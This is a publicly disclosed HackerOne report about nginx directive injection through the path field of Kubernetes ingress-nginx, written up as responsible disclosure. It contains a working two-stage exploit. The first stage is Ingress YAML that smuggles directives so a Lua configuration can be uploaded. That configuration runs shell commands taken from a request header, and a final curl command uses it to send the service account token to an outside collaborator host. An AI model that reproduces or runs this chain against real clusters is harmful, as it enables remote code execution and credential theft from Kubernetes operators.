---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/cloud
  - stack/kubernetes
  - stack/nginx
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2026-03-07
submitted: 2024-09-05T15:29:42.557Z
bounty_usd: null
votes: 92
cve: "CVE-2021-25748"
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "fisjkars"
source: "https://hackerone.com/reports/2701701"
title: "Injection in path parameter of Ingress-nginx"
---
# Injection in path parameter of Ingress-nginx

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 92 | **Program:** Kubernetes | **Disclosed:** 2026-03-07

- Report: [https://hackerone.com/reports/2701701](https://hackerone.com/reports/2701701)
- CWE: Code Injection | CVE: CVE-2021-25748
- Submitted: 2024-09-05T15:29:42.557Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The objective of an Ingress Controller is to act as a gatekeeper for all incoming traffic to a Kubernetes cluster. It is responsible for routing and managing traffic coming into the cluster from external sources, allowing for efficient and secure communication between the cluster and the outside world. 

An attacker in a multi-tenant cluster with permission to create/modify ingresses can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account).

The `path` parameter allows users to specify which HTTP path of the given host should be redirected to the ingress's defined backend, as the `path` parameter is permissive, it is possible to inject arbitrary nginx directives when creating a new ingress. 

As a few restrictions are in place due to one of the mitigations of [CVE-2021-25748](https://github.com/kubernetes/kubernetes/issues/126814) in the corresponding inspector for ingresses, it is not possible to execute code trivially by using the `by_lua` functions, to circumvent this protection we can proceed using a two-stages exploit : 

* We first create an ingress abusing the nginx directive `client_body_in_file_only` in order to upload the body of an HTTP POST request to the ingress's filesystem.
* We send an HTTP POST request to this ingress, with an nginx configuration using the `set_by_lua_block` directive
* Then we create a second ingress that will include this uploaded file
* Finally, we send a last request to abuse the included configuration and execute code on the ingress controller

Stage one, ingress allowing file upload to `/tmp/nginx/f292392` : 
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    kubernetes.io/ingress.class: nginx
  name: f292392-research
  namespace: default
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - backend:
          service:
            name: legitimate-service
            port:
              number: 80
        path: |-
          /f292392body/ {
          limit_except POST              { deny all; }
          client_body_temp_path          /tmp/nginx/f292392;
          client_body_in_file_only       on;
          client_body_buffer_size        128K;
          #
        pathType: Prefix
```

We then send a POST request to the ingress that will upload a malicious nginx configuration to the ingress controller (you should replace the IP address with your own ingress controller's IP) : 

```sh
curl http://f292392.com/f292392body/ --resolve f292392.com:80:4.178.145.81 -k -vv --data-binary '@./exploit.txt'
```

Where `exploit.txt` is our malicious configuration : 

```
set_by_lua_block $my_var { 
            local rsfile = io.popen(ngx.req.get_headers()["pathinjection"]);
            local rschar = rsfile:read("*all");ngx.say(rschar); 
            return rschar;
} 
proxy_set_header X-My-Var $my_var;
```

Now that the file is uploaded, we can create a new ingress that imports it (since we cannot be sure what the exact filename will be, we can use a wildcard character to include this configuration, as we should be the only having queried this ingress : 

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    kubernetes.io/ingress.class: nginx
  name: f292392-research
  namespace: default
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - backend:
          service:
            name: legitimate-service
            port:
              number: 80
        path: |-
          /rcewithhost/ {
          include /tmp/nginx/f292392/*;
  
          #
        pathType: Prefix
```

Using the `set_by_lua_block` directive we set the $my_var variable to the output of the shell command found in the `pathinjection` header, this var is then set as the `X-My-Var` header.

With the following curl command, we can now retrieve the serviceaccount's token : 

```
curl http://f292392.com/rcewithhost/ --resolve f292392.com:80:4.178.145.81 -k -H "pathinjection: curl -F 'file=@/var/run/secrets/kubernetes.io/serviceaccount/token' http://hdyy6lwp6kifbu1cv7euclvuyl4cs3gs.oastify.com.oastify.com"
```

{F3577415}

We now get an HTTP request with the content of the token : 
{F3577417}

Here the content of `nginx.conf` and the uploaded file after the exploit :
{F3577418}

{F3577426}

## Impact

An attacker in a multi-tenant cluster with permission to create/modify ingresses can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account).

## Timeline

- **Report Filed**
- **Report Not Applicable**
- **Report Reopened**
- **Report Triaged**
- **2026-02-04** @fisjkars: Hello @tabbysable,

Thank you for the update ! Yes, we would appreciate being credited in the CVE record. Please acknowledge the discoverers as Maxime Escourbiac and Yassine Bengana (Michelin CERT)

Thank you again, and we’re glad to have contributed to improving Kubernetes security.
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **Report Became Public**
